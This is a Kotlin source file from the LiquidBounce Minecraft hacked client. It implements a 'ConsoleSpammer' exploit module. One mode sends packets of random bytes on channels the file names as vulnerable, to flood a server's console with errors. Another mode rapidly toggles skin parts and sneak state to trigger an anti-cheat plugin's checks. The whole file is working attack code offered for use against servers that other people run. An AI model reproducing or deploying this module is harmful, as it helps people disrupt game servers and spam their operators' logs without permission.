/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.api.minecraft.client.entity.player.WEnumPlayerModelParts
import net.ccbluex.liquidbounce.api.minecraft.network.play.client.ICPacketEntityAction
import net.ccbluex.liquidbounce.event.EventTarget
import net.ccbluex.liquidbounce.event.UpdateEvent
import net.ccbluex.liquidbounce.event.WorldEvent
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.utils.ClientUtils
import net.ccbluex.liquidbounce.utils.WorkerUtils
import net.ccbluex.liquidbounce.utils.timer.MSTimer
import net.ccbluex.liquidbounce.value.IntegerValue
import net.ccbluex.liquidbounce.value.ListValue
import kotlin.random.Random

@ModuleInfo(name = "ConsoleSpammer", description = "Spams the console of the server with errors. (Patched on Bukkit and Spigot servers; They will kick you if you use it)", category = ModuleCategory.EXPLOIT)
class ConsoleSpammer : Module()
{
	private val modeValue = ListValue("Mode", arrayOf("Payload", "MineSecure"), "Payload")
	private val delayValue = IntegerValue("Delay", 0, 0, 500)

	private val payload = classProvider.createPacketBuffer(Unpooled.buffer())
	private val vulnerableChannels = arrayOf("MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem")
	private val timer = MSTimer()

	init
	{
		val rawPayload = ByteArray(Random.nextInt(128))
		Random.nextBytes(rawPayload)
		payload.writeBytes(rawPayload)
	}

	override fun onEnable()
	{
		if (modeValue.get().equals("Payload", ignoreCase = true)) ClientUtils.displayChatMessage(mc.thePlayer, "\u00A78[\u00A7aConsoleSpammer\u00A78] \u00A7c\u00A7lPayload mode is patched on Bukkit and Spigot servers.\u00A7r \u00A7aThey will kick if you use it.")
	}

	@EventTarget
	fun onUpdate(@Suppress("UNUSED_PARAMETER") event: UpdateEvent)
	{
		if (!timer.hasTimePassed(delayValue.get().toLong())) return

		val netHandler = mc.netHandler

		val provider = classProvider

		when (modeValue.get().toLowerCase())
		{
			"payload" -> netHandler.addToSendQueue(provider.createCPacketCustomPayload(vulnerableChannels[Random.nextInt(vulnerableChannels.size)], payload))

			"minesecure" ->
			{
				val player = mc.thePlayer ?: return

				val gameSettings = mc.gameSettings

				// Trigger MineSecure SkinDerp check
				gameSettings.setModelPartEnabled(WEnumPlayerModelParts.HAT, Random.nextBoolean())
				gameSettings.setModelPartEnabled(WEnumPlayerModelParts.JACKET, Random.nextBoolean())
				gameSettings.setModelPartEnabled(WEnumPlayerModelParts.LEFT_PANTS_LEG, Random.nextBoolean())
				gameSettings.setModelPartEnabled(WEnumPlayerModelParts.RIGHT_PANTS_LEG, Random.nextBoolean())
				gameSettings.setModelPartEnabled(WEnumPlayerModelParts.LEFT_SLEEVE, Random.nextBoolean())
				gameSettings.setModelPartEnabled(WEnumPlayerModelParts.RIGHT_SLEEVE, Random.nextBoolean())

				// Trigger MineSecure Sneak check
				WorkerUtils.workers.execute {
					repeat(5) {
						netHandler.addToSendQueue(provider.createCPacketEntityAction(player, ICPacketEntityAction.WAction.STOP_SNEAKING))
						netHandler.addToSendQueue(provider.createCPacketEntityAction(player, ICPacketEntityAction.WAction.START_SNEAKING))
					}
				}
			}
		}
	}

	@EventTarget
	fun onWorld(event: WorldEvent)
	{
		if (event.worldClient == null) state = false
	}
}
